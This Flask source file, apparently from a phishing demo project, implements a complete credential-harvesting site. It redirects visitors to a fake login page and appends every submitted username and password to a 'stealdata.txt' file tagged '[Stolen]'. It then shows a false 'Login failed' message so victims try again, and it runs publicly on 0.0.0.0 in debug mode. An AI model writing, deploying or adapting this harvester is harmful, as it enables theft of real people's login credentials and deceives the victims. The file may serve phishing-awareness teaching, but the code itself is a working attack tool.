# appfake.py
from flask import Flask, render_template, request, redirect, flash, url_for
import os

app = Flask(__name__)
app.secret_key = 'this-is-a-fake-login-demo'

# 首页重定向到伪登录页面
@app.route('/')
def home():
    return redirect(url_for('phishing_login'))

# 显示伪造登录页
@app.route('/login')
def phishing_login():
    return render_template('phishing_login.html')

# 接收伪登录数据
@app.route('/fake_login', methods=['POST'])
def fake_login():
    username = request.form.get('username')
    password = request.form.get('password')

    with open('attacks/Phishing/stealdata.txt', 'a', encoding='utf-8') as f:
        f.write(f"[Stolen] Username: {username} | Password: {password}\n")

    flash("Login failed. Please try again.")
    return redirect(url_for('phishing_login'))

if __name__ == '__main__':
    os.makedirs('templates', exist_ok=True)
    app.run(host='0.0.0.0', port=5001, debug=True)
